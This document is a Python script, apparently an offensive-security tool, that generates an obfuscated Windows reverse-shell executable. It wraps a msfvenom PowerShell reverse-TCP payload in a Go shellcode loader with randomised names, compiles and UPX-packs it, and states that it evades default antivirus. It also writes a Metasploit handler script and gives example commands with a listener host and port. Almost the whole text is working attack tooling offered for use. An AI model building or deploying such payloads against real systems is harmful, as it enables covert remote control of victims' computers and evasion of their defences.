#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Obfuscated_GoHex_ShellCreator.py
# lord[at]vadersecurity.com
""" 
Tested on Blackarch but should work on others
with correct env.

go version go1.14 linux/amd64

${ENV}
export GOPATH=$HOME/go
export GO111MODULE=auto

tested --
Latest: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
10.0.17763 N/A Build 17763

payload: windows/x64/powershell_reverse_tcp
evades default sys install.

python3 Obfuscated_GoHex_ShellCreator.py -l 192.168.1.6 -p 53 --payload \
windows/x64/powershell_reverse_tcp 
----- snip -----
[+] Compiling:
[+] Compressing binary: -> WSmiwnO.exe
[+] Done !

-rwxr-xr-x 1 dualfade dualfade 466K Mar  2 21:28 WSmiwnO.exe*

MSF --
sudo msfconsole -q -x "use exploit/multi/handler; set LHOST wlp59s0; \
set LPORT 53; set PAYLOAD \
windows/x64/powershell_reverse_tcp; \
set EXITFUNC thread; set ExitOnSession false ; rexploit -j -z"
"""

# import --
import os
import string
import random
import argparse
import subprocess
from random import randint
from jinja2 import Environment


# definitions --
def Generate_msf_Payload():
    """ Generate msfvenom hex payload -- """
    print("[+] Shell Options:\n")
    print("[+] LHOST = %s" % args.LHOST)
    print("[+] LPORT = %s" % args.LPORT)
    print("[+] PAYLOAD = %s" % args.PAYLOAD)

    print("\n[+] Generating Hex Payload:")

    # Generate Payload --
    j_LHOST = ("LHOST=" + "%s") % args.LHOST
    j_LPORT = ("LPORT=" + "%s") % args.LPORT
    msf_Payload = subprocess.run([
        "msfvenom", "-p", args.PAYLOAD, j_LHOST, j_LPORT, "-b", "\\x00", "-f",
        "hex"
    ],
                                 capture_output=True)

    p_msfp = str(msf_Payload).split(",")
    s_msfp = str(p_msfp[10]).strip()
    a_msfp = str(s_msfp.replace('stdout=b', ''))
    f_msfp = str(a_msfp.replace('\'', ''))

    # return payload --
    return f_msfp


def Generate_Random_String(min_size, max_size, allowed_chars):
    """ Generate Random char string -- """
    """ https://www.journaldev.com/23782/python-generate-random-string -- """
    return ''.join(
        random.choice(allowed_chars)
        for x in range(randint(min_size, max_size)))


def Golang_Shell_Template():
    """ Golang reverse shell template -- """

    # test random len --
    print("[+] Generating Obfuscation Strings:")
    chars = string.ascii_letters
    go_impo = Generate_Random_String(5, 12, chars)
    go_main = Generate_Random_String(5, 12, chars)
    go_func = Generate_Random_String(5, 12, chars)
    go_rnam = Generate_Random_String(5, 12, chars)

    goShell = ("""
    package main

    import (
        "encoding/hex"
        {{ srand1 }} "github.com/brimstone/go-shellcode"
        )

    func main() {
        {{ srand2 }} := "{{ Payload }}"
        sb, err := hex.DecodeString({{ srand2 }})
        {{ srand3 }}(err)
        {{ srand1 }}.Run(sb)
    }

    func {{ srand3 }}(err error) {
        if err != nil {
                panic(err)
        }
    }
    """)

    # write payload --
    goShell_out = Environment().from_string(goShell).render(
        srand1=go_impo, srand2=go_main, srand3=go_func, Payload=msf_Payload)

    # random name --
    goShell_fName = "".join(['/tmp/', str(go_rnam), '.go']) 

    # write --
    print("[+] Writing golang shell: -> %s" % goShell_fName)
    with open(goShell_fName, 'w') as f:
        f.write(goShell_out)
    with open(goShell_fName) as fin:
        for line in fin:
            print(repr(line))

    return [go_rnam, goShell_fName]


def Create_msfconsole_rcScript():
    """ https://metasploit.help.rapid7.com/docs/resource-scripts -- """
    """ create msfconsole rc script -- """

    rcScript = ("""
    use exploit/multi/handler
    set LHOST {{ lhost }} 
    set LPORT {{ lport }}
    set PAYLOAD {{ payload }}
    set EXITFUNC thread
    set ExitOnSession false
    rexploit -j -z
    """)

    # write rcScript --
    rcScript_out = Environment().from_string(rcScript).render(
        lhost=args.LHOST, lport=args.LPORT, payload=args.PAYLOAD)

    # write --
    print("[+] Writing msfconsole rc: -> ./shell.rc")
    with open('shell.rc', 'w') as rcfile:
              rcfile.write(rcScript_out)


def Golang_Compile_Shell():
    """ create golang shell template -- """
    goVars = Golang_Shell_Template()
    goSrc = goVars[1]
    goBin = goVars[0] + '.exe'
    """ Compile / Strip and UPX compress -- """
    print("[+] Compiling:")
    """ export golang env opts --  """
    os.environ['GOOS'] = "windows"
    os.environ['GOARCH'] = "amd64"
    """ compile -- """
    subprocess.run(['go', 'build', '-ldflags', '-w -s', goSrc],
                   capture_output=True)
    print("[+] Compressing binary: -> %s " % goBin)
    """ upx compress -- """
    subprocess.run(['upx', 'compress', goBin, '--brute'], capture_output=True)
    print("[+] Done !")


# main --
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Obfuscated_GoShellCreator.py')
    parser.add_argument('-l',
                        '--lhost',
                        dest='LHOST',
                        action='store',
                        required=True,
                        help='ex: 192.168.x.x')

    parser.add_argument('-p',
                        '--lport',
                        dest='LPORT',
                        action='store',
                        required=True,
                        help='ex: 443')

    parser.add_argument('--payload',
                        dest="PAYLOAD",
                        action='store',
                        default="windows/x64/powershell_reverse_tcp",
                        help='ex: msfvenom --list payloads')

    # parse --
    args = parser.parse_args()

    # start defs --
    print("\n[+] Starting Obfuscated_GoHex_ShellCreator.py\n")
    msf_Payload = Generate_msf_Payload()
    Golang_Compile_Shell()
    Create_msfconsole_rcScript()

# __EOF__
